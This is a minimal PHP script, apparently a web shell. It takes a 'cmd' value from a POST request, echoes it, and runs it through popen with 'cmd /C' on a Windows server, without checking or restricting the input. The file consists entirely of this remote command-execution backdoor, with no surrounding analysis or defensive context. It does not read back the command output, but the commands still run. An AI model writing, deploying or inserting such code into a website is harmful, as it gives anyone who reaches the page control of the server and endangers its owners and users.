<?php
function e($s) { 
	echo htmlspecialchars($s, ENT_QUOTES); 
}

$cmd = $_POST['cmd'];

	e($cmd);
	$p = popen('cmd /C "' . $cmd . '" 2>&1', 'r');

?>